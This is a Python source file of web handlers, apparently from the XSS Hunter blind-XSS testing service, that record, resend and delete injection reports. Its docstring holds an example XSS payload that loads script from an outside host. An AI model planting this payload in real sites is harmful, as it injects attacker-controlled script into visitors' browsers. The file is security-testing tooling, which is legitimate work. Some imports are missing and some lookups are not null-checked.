
import json

from handlers.base import BaseHandler


class InjectionRequestHandler( BaseHandler ):
    """
    This endpoint is for recording injection attempts.

    It requires the following parameters:

    request - This is the request (note: NOT specific to HTTP) which was performed to attempt the injection.
    owner_correlation_key - This is a private key which is used to link the injection to a specific user - displayed in the settings panel.
    injection_key - This is the injection key which the XSS payload uses to identify itself to the XSS Hunter service ( <script src=//x.xss.ht/aiwlq></script> where aiwlq is the key )

    Sending two correlation requests means that the previous injection_key entry will be replaced.
    """
    def post( self ):
        return_data = {}
        request_dict = json.loads( self.request.body )
        if not self.validate_input( ["request", "owner_correlation_key", "injection_key"], request_dict ):
            return

        injection_key = request_dict.get( "injection_key" )

        injection_request = InjectionRequest()
        injection_request.injection_key = injection_key
        injection_request.request = request_dict.get( "request" )
        owner_correlation_key = request_dict.get( "owner_correlation_key" )
        injection_request.owner_correlation_key = owner_correlation_key

        # Ensure that this is an existing correlation key
        owner_user = session.query( User ).filter_by( owner_correlation_key=owner_correlation_key ).first()
        if owner_user is None:
            return_data["success"] = False
            return_data["message"] = "Invalid owner correlation key provided!"
            self.write( json.dumps( return_data ) )
            return

        self.logit( "User " + owner_user.username + " just sent us an injection attempt with an ID of " + injection_request.injection_key )

        # Replace any previous injections with the same key and owner
        session.query( InjectionRequest ).filter_by( injection_key=injection_key ).filter_by( owner_correlation_key=owner_correlation_key ).delete()

        return_data["success"] = True
        return_data["message"] = "Injection request successfully recorded!"
        session.add( injection_request )
        session.commit()
        self.write( json.dumps( return_data ) )


class ResendInjectionEmailHandler(BaseHandler):

    def post(self):
        post_data = json.loads(self.request.body)

        injection_db_record = Injection.by_owner_and_id(post_data.get("id", ""))
        user = self.get_authenticated_user()

        if injection_db_record.owner_id != user.id:
            self.logit( "Just tried to resend an injection email that wasn't theirs! (ID:" + post_data["id"] + ")", "warn")
            self.error( "Fuck off <3" )
            return

        self.logit( "User just requested to resend the injection record email for URI " + injection_db_record.vulnerable_page )

        send_javascript_callback_message( user.email, injection_db_record )

        self.write({
            "success": True,
            "message": "Email sent!",
        })

class DeleteInjectionHandler(BaseHandler):

    def delete(self):
        delete_data = json.loads(self.request.body)

        if not self.validate_input( ["id"], delete_data ):
            return

        injection_db_record = session.query( Injection ).filter_by( id=str( delete_data.get( "id" ) ) ).first()
        user = self.get_authenticated_user()

        if injection_db_record.owner_id != user.id:
            self.logit( "Just tried to delete an injection email that wasn't theirs! (ID:" + delete_data["id"] + ")", "warn")
            self.error( "Fuck off <3" )
            return

        self.logit( "User delted injection record with an id of " + injection_db_record.id + "(" + injection_db_record.vulnerable_page + ")")

        os.remove( injection_db_record.screenshot )

        injection_db_record = session.query( Injection ).filter_by( id=str( delete_data.get( "id" ) ) ).delete()
        session.commit()

        self.write({
            "success": True,
            "message": "Injection deleted!",
        })
